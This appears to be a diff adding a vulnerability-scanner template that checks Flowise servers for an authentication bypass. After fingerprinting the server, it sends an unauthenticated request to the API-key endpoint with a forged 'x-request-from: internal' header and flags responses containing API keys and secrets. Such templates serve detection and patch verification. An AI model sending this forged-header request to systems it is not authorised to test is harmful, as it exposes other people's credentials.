@@ -1,0 +1,47 @@
+id: flowise-apikey-internal-header
+
+info:
+  name: Flowise Internal Header API Key Leak (CVE-2025-58434 variant)
+  author: survey-engine
+  severity: critical
+  description: |
+    Flowise ≤3.1.2：伪造 x-request-from: internal 未认证 GET /api/v1/apikey
+    可返回 API Key/Secret。本模板只做密钥面指纹，不打 node-custom-function。
+  tags: cve,cve2025,flowise,unauth,apikey,misconfig
+  reference:
+    - https://github.com/FlowiseAI/Flowise
+  metadata:
+    max-request: 3
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/version"
+      - "{{BaseURL}}/api/v1/ping"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "flowise"
+          - "pong"
+        condition: or
+        name: flowise-detected
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/apikey"
+    headers:
+      x-request-from: internal
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "apiKey"
+          - "apiSecret"
+          - "keyName"
+        condition: or
+        name: internal-header-apikey
